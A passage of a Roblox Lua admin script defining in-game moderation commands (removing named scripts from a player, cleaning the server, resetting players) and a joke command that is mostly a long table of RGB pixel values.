					if v:IsA("Script") or v:IsA("LocalScript") then
						v.Disabled = true
						v:Destroy()
						FoundLocal = true
						Ping("Disabled Local Script: "..v.Name, Speaker, 5)
					end
				end
			end
		end)
		ypcall(function()
			for _,v in pairs(name.Backpack:GetChildren()) do
				if string.find(v.Name:lower(), ScriptName) then
					if v:IsA("Script") or v:IsA("LocalScript") then
						v.Disabled = true
						v:Destroy()
						FoundLocal = true
						Ping("Disabled Local Script: "..v.Name, Speaker, 5)
					end
				end
			end
		end)
		ypcall(function()
			for _,v in pairs(name.PlayerGui:GetChildren()) do
				if string.find(v.Name:lower(), ScriptName) then
					if v:IsA("Script") or v:IsA("LocalScript") then
						v.Disabled = true
						v:Destroy()
						FoundLocal = true
						Ping("Disabled Local Script: "..v.Name, Speaker, 5)
					end
				end
			end
		end)
		if FoundLocal == false then
			Ping("Local Script Not Found", Speaker, 5)
		end
	end
end)

Command("FClean", 3, "Fully Cleans The Server", function(Msg, Speaker)
	for _,v in pairs(game:GetChildren()) do
		ypcall(function()
			if v.Name ~= "Workspace" and v.Name ~= "Players" and v.Name ~= "NetworkServer" then
				for _,a in pairs(v:GetChildren()) do
					ypcall(function()
						a:Destroy()
					end)
				end
			elseif v.Name == "Players" then
				for _,plr in pairs(v:GetPlayers()) do
					Clear(plr)
				end
			end
		end)
	end
	Clean()
	Fixl()
	
end)

Command("Clean", 1, "Lightly Cleans The Server", function(Msg, Speaker)
	LClean()
	Fixl()
	
end)

Command("Reset", 2, "Resets A Player", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
				v:LoadCharacter()
				Ping("Reset "..v.Name, Speaker, 5)
			end)
		end
	end
end)
Command("Pc", 4, "Just do it you'll see", function(Msg, Speaker)

	Values = {{0.965,0.984,1},{0.965,0.984,1},{0.973,0.988,1},{0.973,0.988,1},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.988,0.992,1},{0.988,0.992,1},{0.988,0.992,1},{0.988,0.992,1},{1,1,1},{1,1,1},{0.996,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,0.996,1},{0.941,0.914,0.91},{0.847,0.8,0.773},{0.843,0.773,0.725},{0.855,0.761,0.706},{0.859,0.753,0.694},{0.875,0.761,0.694},{0.867,0.753,0.686},{0.875,0.761,0.69},{0.875,0.761,0.694},{0.882,0.761,0.694},{0.89,0.761,0.694},{0.894,0.769,0.698},{0.882,0.757,0.675},{0.886,0.757,0.675},
{0.89,0.757,0.671},{0.886,0.753,0.671},{0.875,0.741,0.651},{0.867,0.71,0.616},{0.855,0.69,0.592},{0.835,0.671,0.565},{0.82,0.655,0.522},{0.804,0.624,0.478},{0.796,0.592,0.447},{0.784,0.569,0.412},{0.757,0.545,0.357},{0.733,0.522,0.333},{0.725,0.51,0.314},{0.718,0.49,0.278},{0.706,0.482,0.267},{0.702,0.478,0.251},{0.71,0.486,0.255},{0.718,0.498,0.239},{0.71,0.502,0.224},{0.737,0.525,0.239},{0.757,0.553,0.247},{0.761,0.557,0.235},{0.769,0.561,0.216},{0.784,0.58,0.216},{0.796,0.596,0.204},{0.8,0.608,0.18},{0.808,0.616,0.173},{0.792,0.592,0.153},{0.792,0.596,0.165},{0.78,0.58,0.161},{0.733,0.533,0.137},{0.71,0.506,0.122},{0.675,0.463,0.102},{0.627,0.408,0.086},{0.569,0.333,0.082},{0.525,0.314,0.082},{0.412,0.188,0.035},{0.345,0.122,0.012},{0.286,0.078,0.004},{0.243,0.051,0.004},{0.224,0.039,0.004},{0.227,0.039,0.004},{0.227,0.035,0.004},{0.224,0.031,0.004},{0.208,0.027,0.004},{0.192,0.031,0.004},{0.196,0.039,0.004},{0.957,0.976,1},{0.957,0.976,1},{0.973,0.984,0.996},{0.973,0.988,1},{0.976,0.992,0.996},{0.98,0.996,1},
{0.988,0.992,1},{0.984,0.988,0.996},{0.988,0.992,1},{0.992,0.996,1},{1,1,1},{1,1,1},{0.996,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.992,0.992},{0.914,0.894,0.894},{0.855,0.8,0.788},{0.871,0.78,0.745},{0.871,0.765,0.714},{0.871,0.769,0.702},{0.871,0.765,0.694},{0.875,0.765,0.69},{0.875,0.757,0.686},{0.882,0.761,0.682},{0.89,0.765,0.686},{0.89,0.769,0.69},{0.89,0.765,0.69},{0.894,0.769,0.69},{0.89,0.765,0.678},{0.89,0.757,0.663},{0.89,0.749,0.659},{0.89,0.745,0.659},{0.871,0.725,0.627},{0.859,0.698,0.592},{0.843,0.671,0.561},{0.808,0.635,0.514},
{0.788,0.612,0.447},{0.769,0.565,0.38},{0.765,0.529,0.341},{0.741,0.494,0.298},{0.694,0.459,0.235},{0.686,0.459,0.188},{0.71,0.494,0.176},{0.753,0.529,0.165},{0.8,0.596,0.141},{0.843,0.631,0.129},{0.863,0.671,0.125},{0.89,0.698,0.129},{0.902,0.718,0.149},{0.91,0.725,0.145},{0.918,0.722,0.118},{0.922,0.737,0.122},{0.922,0.765,0.145},{0.933,0.769,0.149},{0.937,0.773,0.153},{0.957,0.792,0.176},{0.961,0.804,0.184},{0.965,0.804,0.184},{0.965,0.824,0.212},{0.976,0.835,0.224},{0.973,0.831,0.235},{0.953,0.831,0.231},{0.945,0.82,0.247},{0.945,0.808,0.243},{0.941,0.792,0.227},{0.918,0.773,0.216},{0.886,0.722,0.188},{0.831,0.663,0.161},{0.761,0.584,0.122},{0.69,0.506,0.102},{0.608,0.42,0.078},{0.51,0.31,0.051},{0.42,0.231,0.031},{0.286,0.102,0.012},{0.227,0.051,0.004},{0.192,0.031,0.004},{0.161,0.016,0.008},{0.949,0.965,1},{0.949,0.965,1},{0.965,0.98,0.996},{0.969,0.984,0.996},{0.976,0.992,0.996},{0.98,0.996,1},{0.984,0.992,1},{0.984,0.988,0.996},{0.988,0.992,1},{0.996,1,1},{0.992,0.996,1},{0.996,1,1},
{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.992,0.992,0.988},{0.91,0.878,0.871},{0.863,0.796,0.788},{0.871,0.796,0.765},{0.878,0.78,0.733},{0.89,0.769,0.714},{0.886,0.773,0.698},{0.882,0.773,0.69},{0.882,0.773,0.698},{0.89,0.765,0.69},{0.894,0.769,0.678},{0.894,0.769,0.682},{0.886,0.761,0.678},{0.898,0.773,0.69},{0.898,0.773,0.69},{0.902,0.765,0.675},{0.898,0.757,0.655},{0.882,0.741,0.643},{0.882,0.741,0.639},{0.863,0.702,0.592},{0.851,0.671,0.545},{0.835,0.635,0.486},{0.808,0.588,0.431},{0.773,0.537,0.357},{0.737,0.494,0.259},{0.702,0.482,0.216},{0.745,0.553,0.2},{0.812,0.62,0.173},{0.867,0.671,0.173},
{0.867,0.663,0.122},{0.847,0.635,0.067},{0.847,0.627,0.059},{0.843,0.655,0.063},{0.875,0.671,0.086},{0.89,0.694,0.094},{0.882,0.71,0.122},{0.89,0.714,0.125},{0.89,0.698,0.09},{0.89,0.678,0.086},{0.886,0.659,0.075},{0.867,0.651,0.071},{0.859,0.643,0.059},{0.855,0.635,0.051},{0.839,0.616,0.035},{0.835,0.612,0.031},{0.839,0.612,0.039},{0.843,0.616,0.047},{0.835,0.616,0.055},{0.878,0.667,0.086},{0.918,0.729,0.114},{0.929,0.769,0.161},{0.949,0.796,0.184},{0.957,0.808,0.212},{0.949,0.82,0.204},{0.929,0.808,0.204},{0.918,0.796,0.204},{0.906,0.796,0.212},{0.898,0.757,0.192},{0.863,0.706,0.153},{0.827,0.651,0.118},{0.761,0.584,0.106},{0.694,0.51,0.082},{0.604,0.412,0.043},{0.49,0.306,0.024},{0.957,0.973,1},{0.957,0.973,1},{0.969,0.984,0.996},{0.969,0.984,0.996},{0.973,0.988,0.996},{0.976,0.992,0.996},{0.984,0.992,0.996},{0.984,0.992,0.996},{0.988,0.992,1},{0.992,0.996,1},{0.992,0.996,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},
{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{0.91,0.882,0.878},{0.863,0.8,0.792},{0.871,0.796,0.769},{0.886,0.796,0.745},{0.894,0.784,0.722},{0.898,0.78,0.714},{0.902,0.78,0.698},{0.89,0.765,0.678},{0.898,0.776,0.698},{0.894,0.769,0.69},{0.902,0.776,0.682},{0.902,0.776,0.686},{0.906,0.78,0.702},{0.906,0.78,0.698},{0.906,0.773,0.694},{0.902,0.757,0.671},{0.894,0.741,0.643},{0.871,0.729,0.62},{0.859,0.71,0.596},{0.843,0.667,0.545},{0.816,0.635,0.502},{0.78,0.592,0.447},{0.753,0.549,0.392},{0.722,0.522,0.333},{0.761,0.58,0.31},{0.804,0.624,0.294},{0.773,0.592,0.212},{0.741,0.525,0.137},{0.737,0.502,0.086},{0.765,0.533,0.09},{0.8,0.561,0.063},{0.827,0.592,0.075},{0.824,0.616,0.063},{0.847,0.631,0.071},{0.863,0.651,0.075},
{0.875,0.698,0.102},{0.914,0.737,0.133},{0.937,0.773,0.188},{0.953,0.792,0.235},{0.933,0.788,0.22},{0.91,0.753,0.188},{0.898,0.725,0.165},{0.871,0.702,0.137},{0.859,0.667,0.106},{0.831,0.635,0.075},{0.835,0.627,0.055},{0.835,0.624,0.051},{0.812,0.584,0.043},{0.792,0.537,0.02},{0.769,0.506,0.016},{0.741,0.478,0.02},{0.753,0.498,0.012},{0.784,0.545,0.035},{0.816,0.584,0.051},{0.855,0.655,0.071},{0.89,0.706,0.098},{0.902,0.745,0.129},{0.914,0.773,0.161},{0.914,0.773,0.157},{0.906,0.773,0.169},{0.894,0.757,0.173},{0.875,0.733,0.141},{0.859,0.694,0.129},{0.827,0.647,0.106},{0.965,0.984,1},{0.965,0.984,1},{0.969,0.984,0.996},{0.969,0.984,0.996},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.98,0.996,1},{0.988,0.996,1},{0.992,0.996,1},{0.992,0.996,1},{0.992,0.996,1},{0.996,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},
{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,1,1},{0.937,0.918,0.91},{0.859,0.8,0.78},{0.871,0.792,0.757},{0.882,0.792,0.745},{0.89,0.784,0.733},{0.906,0.784,0.718},{0.914,0.784,0.718},{0.91,0.784,0.702},{0.902,0.776,0.678},{0.91,0.78,0.682},{0.906,0.773,0.675},{0.91,0.776,0.678},{0.918,0.784,0.686},{0.914,0.784,0.69},{0.906,0.78,0.69},{0.902,0.773,0.678},{0.902,0.757,0.643},{0.886,0.737,0.62},{0.871,0.706,0.6},{0.843,0.682,0.557},{0.808,0.651,0.529},{0.773,0.616,0.522},{0.745,0.596,0.502},{0.722,0.569,0.463},{0.694,0.549,0.42},{0.694,0.525,0.404},{0.678,0.486,0.361},{0.667,0.459,0.325},{0.647,0.435,0.314},{0.631,0.424,0.255},{0.635,0.424,0.224},{0.643,0.412,0.149},{0.702,0.463,0.125},{0.757,0.533,0.098},{0.776,0.557,0.078},{0.839,0.643,0.106},{0.871,0.686,0.129},{0.867,0.682,0.125},{0.863,0.678,0.11},{0.863,0.675,0.09},{0.878,0.69,0.098},{0.882,0.694,0.106},
{0.906,0.737,0.133},{0.929,0.78,0.169},{0.949,0.808,0.224},{0.933,0.792,0.212},{0.929,0.765,0.192},{0.902,0.733,0.169},{0.882,0.702,0.153},{0.847,0.667,0.122},{0.827,0.635,0.086},{0.812,0.592,0.043},{0.792,0.561,0.016},{0.78,0.525,0.012},{0.733,0.475,0.012},{0.714,0.439,0.008},{0.71,0.439,0.016},{0.722,0.459,0.012},{0.757,0.514,0.016},{0.808,0.576,0.031},{0.847,0.647,0.043},{0.863,0.69,0.067},{0.867,0.71,0.09},{0.867,0.718,0.114},{0.863,0.729,0.129},{0.957,0.976,0.992},{0.957,0.976,0.992},{0.973,0.988,1},{0.969,0.984,0.996},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.988,0.992,1},{0.992,0.996,1},{0.992,0.996,1},{0.992,0.996,1},{0.992,0.996,1},{0.992,0.996,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},
{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.984,0.973,0.969},{0.875,0.827,0.804},{0.867,0.792,0.753},{0.886,0.796,0.749},{0.89,0.796,0.741},{0.886,0.788,0.722},{0.902,0.784,0.702},{0.914,0.788,0.706},{0.914,0.788,0.698},{0.906,0.78,0.682},{0.91,0.78,0.682},{0.914,0.78,0.682},{0.918,0.784,0.69},{0.925,0.792,0.698},{0.918,0.784,0.686},{0.906,0.776,0.675},{0.898,0.765,0.655},{0.882,0.745,0.616},{0.851,0.71,0.592},{0.831,0.694,0.62},{0.796,0.675,0.612},{0.776,0.651,0.569},{0.757,0.627,0.533},{0.745,0.6,0.494},{0.718,0.561,0.447},{0.694,0.533,0.416},{0.686,0.506,0.392},{0.667,0.471,0.353},{0.647,0.439,0.314},{0.643,0.431,0.294},{0.624,0.416,0.255},{0.612,0.392,0.224},{0.596,0.369,0.216},{0.6,0.353,0.2},{0.596,0.353,0.176},{0.592,0.337,0.106},{0.588,0.337,0.039},{0.706,0.467,0.055},{0.878,0.667,0.129},{0.925,0.769,0.188},{0.941,0.788,0.22},{0.925,0.769,0.208},{0.89,0.733,0.173},{0.871,0.682,0.141},{0.824,0.627,0.082},{0.824,0.596,0.047},{0.816,0.596,0.047},{0.824,0.631,0.063},{0.867,0.678,0.078},
{0.886,0.722,0.125},{0.906,0.749,0.149},{0.914,0.753,0.169},{0.902,0.722,0.153},{0.871,0.682,0.133},{0.827,0.631,0.078},{0.788,0.584,0.035},{0.769,0.549,0.012},{0.765,0.518,0.008},{0.749,0.494,0.012},{0.729,0.467,0.008},{0.682,0.404,0.016},{0.659,0.38,0.012},{0.663,0.404,0.008},{0.702,0.463,0.012},{0.761,0.545,0.012},{0.8,0.608,0.027},{0.957,0.976,0.996},{0.957,0.976,0.996},{0.969,0.98,0.996},{0.969,0.984,1},{0.976,0.992,1},{0.973,0.988,1},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.988,0.992,1},{0.988,0.992,1},{0.992,0.996,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.992,1,0.992},{0.929,0.898,0.886},{0.886,0.816,0.788},
{0.89,0.8,0.757},{0.894,0.8,0.745},{0.898,0.8,0.741},{0.902,0.796,0.722},{0.902,0.788,0.698},{0.914,0.788,0.694},{0.914,0.784,0.686},{0.918,0.788,0.686},{0.918,0.788,0.69},{0.922,0.788,0.69},{0.925,0.788,0.698},{0.922,0.788,0.694},{0.914,0.78,0.682},{0.894,0.761,0.639},{0.859,0.725,0.592},{0.831,0.71,0.616},{0.831,0.725,0.671},{0.796,0.698,0.627},{0.776,0.671,0.592},{0.765,0.639,0.545},{0.753,0.616,0.506},{0.729,0.584,0.463},{0.71,0.549,0.42},{0.682,0.518,0.396},{0.675,0.486,0.373},{0.655,0.451,0.329},{0.639,0.435,0.306},{0.631,0.42,0.278},{0.616,0.396,0.263},{0.62,0.376,0.251},{0.604,0.353,0.22},{0.596,0.341,0.192},{0.592,0.345,0.173},{0.588,0.341,0.149},{0.584,0.333,0.133},{0.518,0.263,0.075},{0.565,0.322,0.02},{0.831,0.62,0.047},{0.937,0.788,0.18},{0.973,0.82,0.278},{0.976,0.824,0.286},{0.941,0.816,0.251},{0.922,0.769,0.216},{0.89,0.71,0.173},{0.867,0.671,0.129},{0.851,0.631,0.09},{0.827,0.6,0.071},{0.808,0.58,0.055},{0.804,0.576,0.039},{0.796,0.565,0.027},{0.808,0.58,0.047},{0.835,0.624,0.055},{0.851,0.659,0.078},
{0.847,0.651,0.078},{0.839,0.635,0.078},{0.804,0.6,0.035},{0.765,0.561,0.016},{0.749,0.533,0.004},{0.737,0.518,0.004},{0.718,0.475,0.004},{0.71,0.459,0.012},{0.655,0.392,0.012},{0.608,0.341,0.008},{0.588,0.322,0.004},{0.957,0.976,1},{0.957,0.976,1},{0.965,0.976,0.996},{0.969,0.98,1},{0.973,0.988,1},{0.976,0.992,1},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.988,0.992,1},{0.988,0.992,1},{0.992,0.996,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.988,0.988,0.98},{0.894,0.843,0.82},{0.902,0.816,0.784},{0.914,0.808,0.765},{0.914,0.8,0.753},{0.91,0.796,0.741},{0.914,0.8,0.722},{0.914,0.796,0.706},{0.918,0.792,0.694},
{0.918,0.788,0.69},{0.925,0.792,0.686},{0.929,0.796,0.698},{0.933,0.8,0.702},{0.929,0.792,0.698},{0.922,0.78,0.694},{0.894,0.769,0.624},{0.902,0.812,0.584},{0.875,0.776,0.663},{0.831,0.741,0.686},{0.8,0.714,0.635},{0.784,0.678,0.588},{0.765,0.643,0.549},{0.749,0.616,0.51},{0.741,0.592,0.478},{0.718,0.565,0.435},{0.71,0.541,0.404},{0.69,0.518,0.384},{0.667,0.478,0.349},{0.643,0.439,0.31},{0.635,0.427,0.294},{0.627,0.416,0.275},{0.612,0.388,0.251},{0.604,0.369,0.231},{0.612,0.357,0.22},{0.592,0.341,0.196},{0.6,0.349,0.188},{0.58,0.333,0.157},{0.573,0.329,0.137},{0.576,0.322,0.118},{0.522,0.263,0.063},{0.541,0.286,0.031},{0.804,0.608,0.09},{0.957,0.8,0.216},{0.976,0.843,0.298},{0.973,0.859,0.31},{0.969,0.839,0.318},{0.945,0.808,0.255},{0.918,0.761,0.2},{0.906,0.737,0.173},{0.894,0.71,0.149},{0.863,0.671,0.11},{0.859,0.651,0.094},{0.835,0.627,0.075},{0.82,0.6,0.051},{0.816,0.573,0.051},{0.78,0.549,0.035},{0.749,0.506,0.012},{0.753,0.51,0.02},{0.773,0.541,0.02},{0.788,0.569,0.02},{0.776,0.565,0.012},{0.769,0.561,0.012},
{0.753,0.533,0.008},{0.733,0.502,0.004},{0.698,0.463,0.004},{0.682,0.447,0.004},{0.675,0.427,0.008},{0.957,0.976,1},{0.957,0.976,1},{0.965,0.976,0.996},{0.969,0.98,1},{0.969,0.984,1},{0.976,0.992,1},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.984,0.988,0.996},{0.988,0.992,1},{0.988,0.992,1},{0.992,0.996,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.969,0.953,0.953},{0.906,0.835,0.816},{0.918,0.824,0.784},{0.922,0.808,0.761},{0.918,0.8,0.749},{0.918,0.796,0.729},{0.925,0.8,0.714},{0.925,0.8,0.702},{0.922,0.796,0.698},{0.929,0.796,0.698},{0.933,0.8,0.694},{0.941,0.808,0.706},{0.933,0.804,0.702},{0.922,0.788,0.678},{0.922,0.804,0.588},
{0.961,0.882,0.549},{0.882,0.808,0.686},{0.824,0.749,0.71},{0.804,0.706,0.639},{0.796,0.671,0.584},{0.769,0.635,0.545},{0.765,0.62,0.514},{0.741,0.596,0.478},{0.729,0.576,0.455},{0.718,0.549,0.427},{0.698,0.522,0.388},{0.69,0.51,0.369},{0.667,0.471,0.333},{0.655,0.447,0.306},{0.627,0.42,0.278},{0.616,0.404,0.263},{0.608,0.384,0.247},{0.6,0.365,0.231},{0.6,0.349,0.212},{0.6,0.349,0.212},{0.584,0.333,0.184},{0.565,0.322,0.157},{0.561,0.322,0.137},{0.576,0.322,0.125},{0.565,0.31,0.086},{0.486,0.235,0.031},{0.459,0.204,0.016},{0.804,0.588,0.067},{0.925,0.769,0.18},{0.984,0.855,0.294},{0.988,0.882,0.341},{0.988,0.875,0.345},{0.976,0.855,0.325},{0.957,0.824,0.271},{0.937,0.796,0.216},{0.918,0.757,0.169},{0.902,0.714,0.137},{0.871,0.698,0.125},{0.871,0.694,0.122},{0.835,0.655,0.086},{0.827,0.627,0.071},{0.827,0.608,0.059},{0.812,0.58,0.063},{0.773,0.533,0.031},{0.737,0.494,0.024},{0.729,0.486,0.016},{0.722,0.482,0.008},{0.729,0.502,0.012},{0.745,0.525,0.008},{0.737,0.522,0.004},{0.714,0.494,0.004},{0.69,0.463,0.004},{0.949,0.98,0.996},
{0.949,0.98,0.996},{0.961,0.973,0.992},{0.969,0.98,1},{0.969,0.984,1},{0.973,0.988,1},{0.973,0.988,0.996},{0.98,0.992,0.996},{0.988,0.992,1},{0.988,0.992,1},{0.988,0.992,1},{0.992,0.996,1},{1,1,1},{1,1,1},{0.996,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.992,0.992,0.992},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.957,0.929,0.933},{0.918,0.839,0.808},{0.918,0.835,0.784},{0.922,0.816,0.761},{0.929,0.812,0.737},{0.925,0.804,0.714},{0.929,0.796,0.698},{0.929,0.796,0.702},{0.933,0.796,0.702},{0.933,0.788,0.694},{0.929,0.796,0.69},{0.929,0.8,0.678},{0.922,0.8,0.686},{0.925,0.824,0.58},{0.973,0.898,0.502},{0.875,0.804,0.718},{0.827,0.761,0.725},{0.816,0.722,0.659},{0.792,0.678,0.596},{0.776,0.651,0.561},{0.78,0.635,0.529},
{0.769,0.624,0.506},{0.733,0.592,0.467},{0.729,0.569,0.451},{0.718,0.541,0.424},{0.71,0.537,0.4},{0.675,0.502,0.357},{0.671,0.482,0.345},{0.655,0.447,0.314},{0.639,0.416,0.286},{0.624,0.404,0.267},{0.604,0.384,0.247},{0.596,0.365,0.231},{0.592,0.345,0.216},{0.573,0.337,0.192},{0.58,0.333,0.184},{0.584,0.333,0.169},{0.565,0.322,0.137},{0.569,0.31,0.11},{0.569,0.314,0.098},{0.537,0.278,0.043},{0.463,0.2,0.016},{0.557,0.325,0.035},{0.89,0.714,0.125},{0.91,0.749,0.122},{0.937,0.765,0.149},{0.973,0.816,0.204},{0.988,0.878,0.286},{0.992,0.882,0.333},{0.976,0.867,0.306},{0.965,0.843,0.259},{0.953,0.824,0.247},{0.941,0.8,0.231},{0.929,0.784,0.22},{0.898,0.761,0.18},{0.89,0.737,0.169},{0.871,0.702,0.129},{0.855,0.667,0.114},{0.824,0.627,0.071},{0.816,0.612,0.075},{0.804,0.592,0.075},{0.776,0.557,0.059},{0.745,0.514,0.039},{0.71,0.471,0.02},{0.682,0.435,0.008},{0.686,0.439,0.004},{0.698,0.455,0.004},{0.945,0.976,0.992},{0.945,0.976,0.992},{0.965,0.976,0.996},{0.969,0.98,1},{0.969,0.984,1},{0.969,0.984,0.996},{0.973,0.988,0.996},
{0.976,0.992,0.996},{0.984,0.992,0.996},{0.988,0.992,1},{0.992,0.996,1},{0.992,0.996,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.949,0.922,0.925},{0.925,0.839,0.804},{0.922,0.824,0.773},{0.925,0.816,0.757},{0.929,0.812,0.737},{0.929,0.808,0.714},{0.933,0.8,0.702},{0.929,0.8,0.702},{0.937,0.8,0.694},{0.929,0.788,0.682},{0.933,0.796,0.686},{0.925,0.792,0.678},{0.929,0.824,0.584},{0.976,0.91,0.486},{0.894,0.82,0.714},{0.839,0.769,0.729},{0.812,0.725,0.667},{0.804,0.69,0.616},{0.784,0.659,0.573},{0.773,0.635,0.537},{0.769,0.612,0.498},{0.761,0.596,0.471},{0.745,0.588,0.471},{0.733,0.561,0.447},{0.729,0.541,0.427},{0.706,0.522,0.388},{0.675,0.49,0.349},
{0.675,0.475,0.337},{0.651,0.459,0.322},{0.635,0.424,0.29},{0.627,0.408,0.267},{0.6,0.38,0.243},{0.592,0.373,0.235},{0.592,0.361,0.227},{0.576,0.341,0.2},{0.58,0.333,0.184},{0.569,0.322,0.157},{0.569,0.325,0.141},{0.573,0.314,0.114},{0.573,0.318,0.106},{0.553,0.282,0.055},{0.51,0.239,0.016},{0.392,0.133,0.012},{0.553,0.333,0.043},{0.914,0.745,0.2},{0.98,0.812,0.224},{0.937,0.729,0.129},{0.914,0.702,0.082},{0.929,0.741,0.114},{0.984,0.827,0.2},{0.992,0.867,0.278},{0.988,0.882,0.325},{0.984,0.878,0.322},{0.976,0.863,0.306},{0.957,0.843,0.275},{0.961,0.831,0.278},{0.945,0.804,0.247},{0.922,0.769,0.196},{0.898,0.741,0.165},{0.859,0.702,0.129},{0.843,0.671,0.106},{0.839,0.659,0.114},{0.808,0.627,0.094},{0.784,0.576,0.059},{0.761,0.525,0.035},{0.722,0.478,0.016},{0.675,0.427,0.004},{0.941,0.976,1},{0.941,0.976,1},{0.965,0.976,0.996},{0.969,0.98,1},{0.969,0.984,1},{0.969,0.984,0.996},{0.973,0.988,1},{0.98,0.996,1},{0.98,0.992,0.996},{0.984,0.996,1},{0.988,0.992,1},{0.996,1,1},{0.996,1,1},
{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.949,0.918,0.925},{0.925,0.839,0.804},{0.929,0.824,0.769},{0.929,0.82,0.749},{0.933,0.812,0.729},{0.933,0.804,0.71},{0.937,0.804,0.706},{0.933,0.8,0.698},{0.941,0.804,0.69},{0.941,0.792,0.678},{0.937,0.784,0.663},{0.929,0.812,0.592},{0.984,0.918,0.482},{0.898,0.847,0.686},{0.835,0.784,0.757},{0.824,0.733,0.69},{0.792,0.686,0.608},{0.78,0.651,0.557},{0.773,0.631,0.529},{0.765,0.612,0.49},{0.769,0.596,0.471},{0.749,0.565,0.447},{0.753,0.569,0.443},{0.745,0.553,0.427},{0.737,0.549,0.416},{0.706,0.518,0.38},{0.682,0.478,0.345},{0.675,0.467,0.333},{0.663,0.467,0.322},{0.635,0.435,0.29},{0.624,0.412,0.263},{0.608,0.4,0.251},{0.596,0.38,0.235},
{0.588,0.357,0.216},{0.576,0.345,0.2},{0.588,0.337,0.188},{0.584,0.333,0.169},{0.573,0.325,0.145},{0.573,0.318,0.125},{0.576,0.318,0.098},{0.573,0.302,0.075},{0.541,0.271,0.027},{0.451,0.169,0.008},{0.341,0.082,0.004},{0.463,0.259,0.039},{0.839,0.675,0.157},{0.973,0.843,0.278},{0.988,0.847,0.278},{0.957,0.757,0.145},{0.867,0.631,0.055},{0.878,0.631,0.059},{0.918,0.725,0.145},{0.992,0.851,0.239},{0.992,0.882,0.298},{0.996,0.89,0.318},{0.992,0.882,0.341},{0.992,0.871,0.322},{0.984,0.855,0.286},{0.965,0.839,0.259},{0.941,0.8,0.243},{0.906,0.757,0.188},{0.875,0.725,0.145},{0.867,0.702,0.125},{0.851,0.678,0.106},{0.831,0.639,0.075},{0.792,0.596,0.024},{0.776,0.565,0.035},{0.941,0.976,1},{0.941,0.976,1},{0.961,0.973,0.992},{0.965,0.976,0.996},{0.969,0.984,0.996},{0.969,0.984,0.996},{0.969,0.984,0.996},{0.973,0.988,1},{0.976,0.992,1},{0.98,0.996,1},{0.988,0.992,1},{0.988,0.992,1},{0.996,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},
